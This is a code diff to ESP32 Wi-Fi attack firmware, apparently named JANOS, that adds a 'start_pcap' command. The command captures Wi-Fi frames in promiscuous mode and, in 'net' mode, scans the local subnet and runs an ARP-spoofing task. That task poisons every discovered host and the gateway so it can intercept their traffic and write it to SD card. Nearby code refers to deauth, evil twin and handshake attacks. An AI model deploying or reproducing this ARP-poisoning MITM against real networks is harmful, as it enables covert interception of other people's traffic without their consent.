@@ -111,7 +111,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.5.6"
+#define JANOS_VERSION "1.5.7"
 
 #define OTA_GITHUB_OWNER "C5Lab"
 #define OTA_GITHUB_REPO "projectZero"
@@ -319,6 +319,46 @@ static volatile bool sniff_oled_dirty = false;
 static TaskHandle_t sniffer_channel_task_handle = NULL;
 static uint32_t sniffer_packet_counter = 0;
 static uint32_t sniffer_last_debug_packet = 0;
+
+// PCAP capture state
+typedef enum {
+    PCAP_MODE_NONE = 0,
+    PCAP_MODE_RADIO,
+    PCAP_MODE_NET
+} pcap_capture_mode_t;
+
+typedef struct {
+    uint16_t len;
+    int64_t timestamp_us;
+    uint8_t data[];
+} pcap_queued_frame_t;
+
+static volatile bool pcap_capture_active = false;
+static pcap_capture_mode_t pcap_capture_mode = PCAP_MODE_NONE;
+static FILE *pcap_capture_file = NULL;
+static TaskHandle_t pcap_writer_task_handle = NULL;
+static QueueHandle_t pcap_packet_queue = NULL;
+static uint32_t pcap_capture_frame_count = 0;
+static uint32_t pcap_capture_drop_count = 0;
+static char pcap_capture_filepath[64];
+static netif_input_fn pcap_original_input = NULL;
+static netif_linkoutput_fn pcap_original_linkoutput = NULL;
+
+// PCAP ARP spoofing state (net mode MITM)
+#define PCAP_ARP_MAX_HOSTS 64
+
+typedef struct {
+    uint8_t mac[6];
+    uint32_t ip;
+} pcap_arp_host_t;
+
+static TaskHandle_t pcap_arp_task_handle = NULL;
+static volatile bool pcap_arp_active = false;
+static pcap_arp_host_t pcap_arp_hosts[PCAP_ARP_MAX_HOSTS];
+static int pcap_arp_host_count = 0;
+static uint8_t pcap_arp_gateway_mac[6];
+static uint32_t pcap_arp_gateway_ip = 0;
+static uint8_t pcap_arp_own_mac[6];
 
 // Deauth/Evil Twin attack task
 static TaskHandle_t deauth_attack_task_handle = NULL;
@@ -1277,6 +1317,7 @@ static int start_beacon_spam_internal(void);
 static int cmd_select_html(int argc, char **argv);
 static int cmd_show_pass(int argc, char **argv);
 static int cmd_file_delete(int argc, char **argv);
+static int cmd_start_pcap(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
 static int cmd_wifi_connect(int argc, char **argv);
 static int cmd_list_hosts(int argc, char **argv);
@@ -1403,6 +1444,15 @@ static void get_timestamp_string(char* buffer, size_t size);
 static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
 static bool wait_for_gps_fix(int timeout_seconds);
 static int find_next_wardrive_file_number(void);
+// PCAP capture functions
+static int find_next_pcap_file_number(void);
+static void pcap_radio_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
+static void pcap_enqueue_frame(const uint8_t *data, uint16_t len);
+static void pcap_writer_task(void *param);
+static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp);
+static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p);
+static void pcap_arp_spoof_task(void *param);
+
 static bool wigle_split_key_pair(const char *input,
                                  char *api_name,
                                  size_t api_name_sz,
@@ -7367,6 +7417,68 @@ static int cmd_stop(int argc, char **argv) {
     // Stop packet monitor if running
     packet_monitor_stop();
 
+    // Stop PCAP capture if running
+    if (pcap_capture_active) {
+        pcap_capture_active = false;
+
+        if (pcap_capture_mode == PCAP_MODE_RADIO) {
+            esp_wifi_set_promiscuous(false);
+        } else if (pcap_capture_mode == PCAP_MODE_NET) {
+            if (pcap_arp_active) {
+                pcap_arp_active = false;
+                for (int i = 0; i < 60 && pcap_arp_task_handle != NULL; i++) {
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                }
+                if (pcap_arp_task_handle != NULL) {
+                    vTaskDelete(pcap_arp_task_handle);
+                    pcap_arp_task_handle = NULL;
+                    MY_LOG_INFO(TAG, "ARP spoof task force-deleted");
+                }
+                pcap_arp_host_count = 0;
+            }
+
+            esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+            if (sta) {
+                struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta);
+                if (lwip_nif) {
+                    if (pcap_original_input) lwip_nif->input = pcap_original_input;
+                    if (pcap_original_linkoutput) lwip_nif->linkoutput = pcap_original_linkoutput;
+                }
+            }
+            pcap_original_input = NULL;
+            pcap_original_linkoutput = NULL;
+        }
+
+        for (int i = 0; i < 40 && pcap_writer_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        if (pcap_writer_task_handle != NULL) {
+            vTaskDelete(pcap_writer_task_handle);
+            pcap_writer_task_handle = NULL;
+        }
+
+        if (pcap_packet_queue) {
+            pcap_queued_frame_t *leftover = NULL;
+            while (xQueueReceive(pcap_packet_queue, &leftover, 0) == pdTRUE) {
+                free(leftover);
+            }
+            vQueueDelete(pcap_packet_queue);
+            pcap_packet_queue = NULL;
+        }
+
+        if (pcap_capture_file) {
+            fclose(pcap_capture_file);
+            pcap_capture_file = NULL;
+            sd_sync();
+        }
+
+        MY_LOG_INFO(TAG, "PCAP saved: %s (%lu frames, %lu drops)",
+                    pcap_capture_filepath,
+                    (unsigned long)pcap_capture_frame_count,
+                    (unsigned long)pcap_capture_drop_count);
+        pcap_capture_mode = PCAP_MODE_NONE;
+    }
+
     // Stop handshake attack task if running
     if (handshake_attack_active || handshake_attack_task_handle != NULL) {
         MY_LOG_INFO(TAG, "Stopping handshake attack task...");
@@ -9416,6 +9528,237 @@ static int cmd_start_sniffer(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
     }
     
+    return 0;
+}
+
+static int cmd_start_pcap(int argc, char **argv) {
+    pcap_capture_mode_t mode = PCAP_MODE_RADIO;
+
+    if (argc >= 2) {
+        if (strcasecmp(argv[1], "net") == 0) {
+            mode = PCAP_MODE_NET;
+        } else if (strcasecmp(argv[1], "radio") == 0) {
+            mode = PCAP_MODE_RADIO;
+        } else {
+            MY_LOG_INFO(TAG, "Usage: start_pcap radio|net");
+            return 1;
+        }
+    }
+
+    if (pcap_capture_active) {
+        MY_LOG_INFO(TAG, "PCAP capture already active. Use 'stop' first.");
+        return 1;
+    }
+
+    operation_stop_requested = false;
+
+    if (mode == PCAP_MODE_NET) {
+        wifi_ap_record_t ap_info;
+        if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+            MY_LOG_INFO(TAG, "Not connected to WiFi. Use 'wifi_connect' first.");
+            return 1;
+        }
+    }
+
+    if (mode == PCAP_MODE_RADIO) {
+        if (!ensure_wifi_mode()) {
+            MY_LOG_INFO(TAG, "Failed to initialize WiFi for radio capture.");
+            return 1;
+        }
+    }
+
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        return 1;
+    }
+
+    struct stat st;
+    if (stat("/sdcard/lab/pcaps", &st) != 0) {
+        if (mkdir("/sdcard/lab/pcaps", 0755) != 0) {
+            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/pcaps directory");
+            return 1;
+        }
+        sd_sync();
+    }
+
+    int file_num = find_next_pcap_file_number();
+    snprintf(pcap_capture_filepath, sizeof(pcap_capture_filepath),
+             "/sdcard/lab/pcaps/sniff_%d.pcap", file_num);
+
+    pcap_capture_file = fopen(pcap_capture_filepath, "wb");
+    if (!pcap_capture_file) {
+        MY_LOG_INFO(TAG, "Failed to open %s for writing", pcap_capture_filepath);
+        return 1;
+    }
+
+    uint32_t linktype = (mode == PCAP_MODE_RADIO) ? 105 : 1;
+    pcap_global_header_t ghdr = {
+        .magic_number = 0xa1b2c3d4,
+        .version_major = 2,
+        .version_minor = 4,
+        .thiszone = 0,
+        .sigfigs = 0,
+        .snaplen = 65535,
+        .network = linktype
+    };
+    fwrite(&ghdr, 1, sizeof(ghdr), pcap_capture_file);
+    fflush(pcap_capture_file);
+
+    pcap_capture_frame_count = 0;
+    pcap_capture_drop_count = 0;
+
+    pcap_packet_queue = xQueueCreate(256, sizeof(pcap_queued_frame_t *));
+    if (!pcap_packet_queue) {
+        MY_LOG_INFO(TAG, "Failed to create PCAP packet queue");
+        fclose(pcap_capture_file);
+        pcap_capture_file = NULL;
+        return 1;
+    }
+
+    pcap_capture_mode = mode;
+    pcap_capture_active = true;
+
+    xTaskCreate(pcap_writer_task, "pcap_writer", 4096, NULL, 5, &pcap_writer_task_handle);
+
+    if (mode == PCAP_MODE_RADIO) {
+        wifi_promiscuous_filter_t filter = {
+            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
+                           WIFI_PROMIS_FILTER_MASK_DATA |
+                           WIFI_PROMIS_FILTER_MASK_CTRL
+        };
+        esp_wifi_set_promiscuous_filter(&filter);
+        esp_wifi_set_promiscuous_rx_cb(pcap_radio_promiscuous_cb);
+        esp_wifi_set_promiscuous(true);
+
+        oled_display_update_full("> PCAP Radio", "  Promiscuous", "  Capturing...", pcap_capture_filepath + 18);
+        MY_LOG_INFO(TAG, "PCAP radio capture started -> %s", pcap_capture_filepath);
+    } else {
+        esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+        if (!sta_netif) {
+            MY_LOG_INFO(TAG, "Failed to get STA netif");
+            pcap_capture_active = false;
+            fclose(pcap_capture_file);
+            pcap_capture_file = NULL;
+            vQueueDelete(pcap_packet_queue);
+            pcap_packet_queue = NULL;
+            return 1;
+        }
+
+        struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
+        if (!lwip_nif) {
+            MY_LOG_INFO(TAG, "Failed to get lwIP netif");
+            pcap_capture_active = false;
+            fclose(pcap_capture_file);
+            pcap_capture_file = NULL;
+            vQueueDelete(pcap_packet_queue);
+            pcap_packet_queue = NULL;
+            return 1;
+        }
+
+        // --- ARP spoof MITM setup ---
+        esp_wifi_get_mac(WIFI_IF_STA, pcap_arp_own_mac);
+
+        esp_netif_ip_info_t ip_info;
+        esp_netif_get_ip_info(sta_netif, &ip_info);
+        pcap_arp_gateway_ip = ip_info.gw.addr;
+
+        bool gw_found = false;
+        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+            ip4_addr_t *ip_ret;
+            struct netif *nif_ret;
+            struct eth_addr *eth_ret;
+            if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                if (ip_ret->addr == pcap_arp_gateway_ip) {
+                    memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
+                    gw_found = true;
+                    break;
+                }
+            }
+        }
+        if (!gw_found) {
+            MY_LOG_INFO(TAG, "PCAP net: Gateway not in ARP table, sending ARP request...");
+            ip4_addr_t gw_ip = { .addr = pcap_arp_gateway_ip };
+            etharp_request(lwip_nif, &gw_ip);
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *nif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == pcap_arp_gateway_ip) {
+                        memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
+                        gw_found = true;
+                        break;
+                    }
+                }
+            }
+        }
+        if (!gw_found) {
+            MY_LOG_INFO(TAG, "PCAP net: Could not find gateway MAC. Continuing without ARP spoof.");
+        } else {
+            MY_LOG_INFO(TAG, "PCAP net: Gateway %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X",
+                        ip4_addr1_val(ip_info.gw), ip4_addr2_val(ip_info.gw),
+                        ip4_addr3_val(ip_info.gw), ip4_addr4_val(ip_info.gw),
+                        pcap_arp_gateway_mac[0], pcap_arp_gateway_mac[1], pcap_arp_gateway_mac[2],
+                        pcap_arp_gateway_mac[3], pcap_arp_gateway_mac[4], pcap_arp_gateway_mac[5]);
+
+            oled_display_update_full("> PCAP Net", "  ARP scanning...", "  Discovering hosts", "");
+            MY_LOG_INFO(TAG, "PCAP net: Scanning subnet for hosts...");
+
+            uint32_t ip_h = ntohl(ip_info.ip.addr);
+            uint32_t mask_h = ntohl(ip_info.netmask.addr);
+            uint32_t net_h = ip_h & mask_h;
+            uint32_t bcast_h = net_h | ~mask_h;
+            int req_sent = 0;
+            for (uint32_t t = net_h + 1; t < bcast_h && req_sent < 254; t++) {
+                ip4_addr_t target_ip;
+                target_ip.addr = htonl(t);
+                etharp_request(lwip_nif, &target_ip);
+                req_sent++;
+                if (req_sent % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));
+            }
+            MY_LOG_INFO(TAG, "PCAP net: Sent %d ARP requests, waiting for responses...", req_sent);
+            vTaskDelay(pdMS_TO_TICKS(3000));
+
+            pcap_arp_host_count = 0;
+            uint32_t own_ip = ip_info.ip.addr;
+            for (int i = 0; i < ARP_TABLE_SIZE && pcap_arp_host_count < PCAP_ARP_MAX_HOSTS; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *nif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == own_ip || ip_ret->addr == pcap_arp_gateway_ip) continue;
+                    memcpy(pcap_arp_hosts[pcap_arp_host_count].mac, eth_ret->addr, 6);
+                    pcap_arp_hosts[pcap_arp_host_count].ip = ip_ret->addr;
+                    pcap_arp_host_count++;
+                }
+            }
+
+            MY_LOG_INFO(TAG, "PCAP net: Found %d hosts to spoof", pcap_arp_host_count);
+
+            if (pcap_arp_host_count > 0) {
+                pcap_arp_active = true;
+                xTaskCreate(pcap_arp_spoof_task, "pcap_arp", 4096, NULL, 5, &pcap_arp_task_handle);
+                MY_LOG_INFO(TAG, "PCAP net: ARP spoof MITM started (IP forwarding enabled)");
+            }
+        }
+        // --- End ARP spoof setup ---
+
+        pcap_original_input = lwip_nif->input;
+        pcap_original_linkoutput = lwip_nif->linkoutput;
+        lwip_nif->input = pcap_netif_input_hook;
+        lwip_nif->linkoutput = pcap_netif_linkoutput_hook;
+
+        {
+            char oled_l3[32];
+            snprintf(oled_l3, sizeof(oled_l3), "  MITM %d hosts", pcap_arp_host_count);
+            oled_display_update_full("> PCAP Net", "  Ethernet RX/TX", oled_l3, pcap_capture_filepath + 18);
+        }
+        MY_LOG_INFO(TAG, "PCAP net capture started -> %s", pcap_capture_filepath);
+    }
+
+    MY_LOG_INFO(TAG, "Use 'stop' to stop capture and save file.");
     return 0;
 }
 
@@ -14124,6 +14467,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&download_cmd));
 
+    const esp_console_cmd_t pcap_cmd = {
+        .command = "start_pcap",
+        .help = "Capture WiFi traffic to PCAP: start_pcap radio|net",
+        .hint = "radio|net",
+        .func = &cmd_start_pcap,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&pcap_cmd));
+
     const esp_console_cmd_t stop_cmd = {
         .command = "stop",
         .help = "Stop all running operations",
@@ -15491,6 +15843,191 @@ static void sniffer_channel_task(void *pvParameters) {
     vTaskDelete(NULL);
 }
 
+// ============================================================================
+// PCAP capture functions
+// ============================================================================
+
+static void pcap_enqueue_frame(const uint8_t *data, uint16_t len) {
+    if (!pcap_capture_active || !pcap_packet_queue || len == 0) return;
+
+    pcap_queued_frame_t *frame = malloc(sizeof(pcap_queued_frame_t) + len);
+    if (!frame) return;
+
+    frame->len = len;
+    frame->timestamp_us = esp_timer_get_time();
+    memcpy(frame->data, data, len);
+
+    if (xQueueSend(pcap_packet_queue, &frame, 0) != pdTRUE) {
+        free(frame);
+        pcap_capture_drop_count++;
+    }
+}
+
+static void pcap_radio_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!pcap_capture_active) return;
+    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
+    uint16_t len = pkt->rx_ctrl.sig_len;
+    if (len == 0) return;
+    pcap_enqueue_frame(pkt->payload, len);
+}
+
+static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp) {
+    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
+        uint8_t tmp[1600];
+        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
+        if (copied > 0) {
+            pcap_enqueue_frame(tmp, copied);
+        }
+    }
+    return pcap_original_input(p, inp);
+}
+
+static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p) {
+    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
+        uint8_t tmp[1600];
+        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
+        if (copied > 0) {
+            pcap_enqueue_frame(tmp, copied);
+        }
+    }
+    return pcap_original_linkoutput(netif, p);
+}
+
+static void pcap_writer_task(void *param) {
+    (void)param;
+    uint32_t flush_counter = 0;
+    pcap_queued_frame_t *frame = NULL;
+
+    MY_LOG_INFO(TAG, "PCAP writer task started");
+
+    while (pcap_capture_active) {
+        if (xQueueReceive(pcap_packet_queue, &frame, pdMS_TO_TICKS(200)) == pdTRUE) {
+            pcap_record_header_t rec = {
+                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
+                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
+                .incl_len = frame->len,
+                .orig_len = frame->len
+            };
+            fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
+            fwrite(frame->data, 1, frame->len, pcap_capture_file);
+            free(frame);
+            pcap_capture_frame_count++;
+            flush_counter++;
+            if (flush_counter >= 50) {
+                fflush(pcap_capture_file);
+                flush_counter = 0;
+            }
+        }
+    }
+
+    while (xQueueReceive(pcap_packet_queue, &frame, 0) == pdTRUE) {
+        pcap_record_header_t rec = {
+            .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
+            .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
+            .incl_len = frame->len,
+            .orig_len = frame->len
+        };
+        fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
+        fwrite(frame->data, 1, frame->len, pcap_capture_file);
+        free(frame);
+        pcap_capture_frame_count++;
+    }
+
+    fflush(pcap_capture_file);
+    fclose(pcap_capture_file);
+    pcap_capture_file = NULL;
+    sd_sync();
+
+    MY_LOG_INFO(TAG, "PCAP writer done: %s (%lu frames, %lu drops)",
+                pcap_capture_filepath,
+                (unsigned long)pcap_capture_frame_count,
+                (unsigned long)pcap_capture_drop_count);
+
+    pcap_writer_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void pcap_arp_spoof_task(void *param) {
+    (void)param;
+
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        MY_LOG_INFO(TAG, "ARP spoof: STA netif not found");
+        pcap_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_nif || !lwip_nif->linkoutput) {
+        MY_LOG_INFO(TAG, "ARP spoof: lwIP netif or linkoutput not available");
+        pcap_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Poisoning %d hosts + gateway", pcap_arp_host_count);
+    uint32_t round = 0;
+
+    while (pcap_arp_active) {
+        for (int i = 0; i < pcap_arp_host_count && pcap_arp_active; i++) {
+            send_arp_reply(lwip_nif,
+                           pcap_arp_hosts[i].mac,   // Eth dst: victim
+                           pcap_arp_own_mac,         // Eth src: our MAC
+                           pcap_arp_own_mac,         // ARP sender MAC: our MAC
+                           pcap_arp_gateway_ip,      // ARP sender IP: gateway (spoofed)
+                           pcap_arp_hosts[i].mac,    // ARP target MAC: victim
+                           pcap_arp_hosts[i].ip);    // ARP target IP: victim
+
+            send_arp_reply(lwip_nif,
+                           pcap_arp_gateway_mac,     // Eth dst: gateway
+                           pcap_arp_own_mac,          // Eth src: our MAC
+                           pcap_arp_own_mac,          // ARP sender MAC: our MAC
+                           pcap_arp_hosts[i].ip,      // ARP sender IP: victim (spoofed)
+                           pcap_arp_gateway_mac,      // ARP target MAC: gateway
+                           pcap_arp_gateway_ip);      // ARP target IP: gateway
+
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+
+        round++;
+        if (round % 5 == 0) {
+            MY_LOG_INFO(TAG, "ARP spoof: round %lu, %d hosts, captured %lu, dropped %lu",
+                        (unsigned long)round, pcap_arp_host_count,
+                        (unsigned long)pcap_capture_frame_count,
+                        (unsigned long)pcap_capture_drop_count);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(2000));
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Sending corrective ARP to restore network...");
+    for (int pass = 0; pass < 3; pass++) {
+        for (int i = 0; i < pcap_arp_host_count; i++) {
+            send_arp_reply(lwip_nif,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_ip,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].ip);
+
+            send_arp_reply(lwip_nif,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].ip,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_ip);
+        }
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Network restored, task ending");
+    pcap_arp_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     sniffer_packet_counter++;
     sniff_oled_packets = sniffer_packet_counter;
@@ -16542,6 +17079,19 @@ static esp_err_t create_sd_directories(void) {
         MY_LOG_INFO(TAG, "/sdcard/lab/wardrives already exists");
     }
     
+    // Create /sdcard/lab/pcaps directory
+    if (stat("/sdcard/lab/pcaps", &st) != 0) {
+        MY_LOG_INFO(TAG, "Creating /sdcard/lab/pcaps directory...");
+        if (mkdir("/sdcard/lab/pcaps", 0755) != 0) {
+            MY_LOG_INFO(TAG, "Failed to create /sdcard/lab/pcaps directory: %s", strerror(errno));
+            return ESP_FAIL;
+        }
+        sd_sync();
+        MY_LOG_INFO(TAG, "/sdcard/lab/pcaps created successfully");
+    } else {
+        MY_LOG_INFO(TAG, "/sdcard/lab/pcaps already exists");
+    }
+    
     MY_LOG_INFO(TAG, "All required directories are ready");
     return ESP_OK;
 }
@@ -16754,6 +17304,21 @@ static int find_next_wardrive_file_number(void) {
     MY_LOG_INFO(TAG, "Highest existing file number: %d, next will be: %d", max_number, next_number);
     
     return next_number;
+}
+
+static int find_next_pcap_file_number(void) {
+    int max_number = 0;
+    char filename[64];
+    for (int i = 1; i <= 9999; i++) {
+        snprintf(filename, sizeof(filename), "/sdcard/lab/pcaps/sniff_%d.pcap", i);
+        struct stat file_stat;
+        if (stat(filename, &file_stat) == 0) {
+            max_number = i;
+        } else {
+            break;
+        }
+    }
+    return max_number + 1;
 }
 
 // Save evil twin password to SD card
